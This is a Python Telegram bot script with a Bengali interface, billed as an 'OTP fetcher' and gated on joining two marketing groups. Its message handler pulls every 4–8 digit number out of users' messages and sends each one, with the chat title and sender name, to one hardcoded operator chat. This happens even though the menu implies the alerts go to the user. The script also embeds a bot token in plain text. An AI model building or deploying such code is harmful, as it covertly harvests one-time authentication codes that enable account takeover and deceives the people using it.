import logging
import re
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, MessageHandler, filters, CallbackContext, CommandHandler, CallbackQueryHandler
from telegram.constants import ParseMode

TOKEN = "8862479708:AAG6jNfd_SKeBqA1Jq3BmL9mRlg0iOVQdTI"
YOUR_CHAT_ID = 7455109015

# আলাদা গ্রুপ
GROUP1 = "EASY_MARKETING1"
GROUP2 = "EASY_METHOD1"

OTP_PATTERN = re.compile(r'\b(\d{4,8})\b')
authorized_users = set()

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def check_group_membership(bot, user_id, group):
    try:
        member = await bot.get_chat_member(chat_id=f"@{group}", user_id=user_id)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

async def main_menu(update: Update, context: CallbackContext, edit=False):
    keyboard = [
        [InlineKeyboardButton("✅ Verify Group 1 (Easy Marketing)", callback_data="verify1")],
        [InlineKeyboardButton("✅ Verify Group 2 (Easy Method)", callback_data="verify2")],
        [InlineKeyboardButton("📊 My Status", callback_data="status")],
        [InlineKeyboardButton("🛒 Services & Pricing", callback_data="services")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")],
        [InlineKeyboardButton("👨‍💼 Support", callback_data="support")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = """🔥 **SUPER FAST OTP FETCHER BOT**

**দুইটা গ্রুপ আলাদাভাবে ভেরিফাই করুন:**
1. @EASY_MARKETING1
2. @EASY_METHOD1

OTP আসলে অটো অ্যালার্ট পাবেন।"""

    if edit and update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
    elif update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)

async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data

    if data == "verify1":
        if await check_group_membership(context.bot, user_id, GROUP1):
            authorized_users.add(user_id)
            await query.answer("✅ Group 1 ভেরিফাই সফল!", show_alert=True)
            await asyncio.sleep(1.5)
            try:
                await query.message.delete()
            except:
                pass
            await main_menu(update, context)
        else:
            await query.answer("❌ @EASY_MARKETING1 গ্রুপে জয়েন হোন", show_alert=True)

    elif data == "verify2":
        if await check_group_membership(context.bot, user_id, GROUP2):
            authorized_users.add(user_id)
            await query.answer("✅ Group 2 ভেরিফাই সফল!", show_alert=True)
            await asyncio.sleep(1.5)
            try:
                await query.message.delete()
            except:
                pass
            await main_menu(update, context)
        else:
            await query.answer("❌ @EASY_METHOD1 গ্রুপে জয়েন হোন", show_alert=True)

    elif data == "status":
        state = "✅ ভেরিফাইড" if user_id in authorized_users else "❌ একটা গ্রুপ ভেরিফাই করুন"
        await query.answer(f"স্ট্যাটাস: {state}")

    else:
        await query.answer("শীঘ্রই আসছে...", show_alert=True)

async def start(update: Update, context: CallbackContext):
    await main_menu(update, context)

async def handle_message(update: Update, context: CallbackContext):
    if update.effective_user.id not in authorized_users:
        return

    otps = OTP_PATTERN.findall(update.message.text or "")
    if otps:
        for otp in otps:
            alert = f"""🔥 **FAST OTP DETECTED!** 🔥

**OTP:** `{otp}`
**গ্রুপ:** {update.message.chat.title or 'Private'}
**ইউজার:** {update.effective_user.first_name}
**টাইম:** {update.message.date}"""
            try:
                await context.bot.send_message(YOUR_CHAT_ID, alert, parse_mode=ParseMode.MARKDOWN)
            except:
                pass

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🚀 BOT চালু হয়েছে...")
    app.run_polling()

if __name__ == '__main__':
    main()
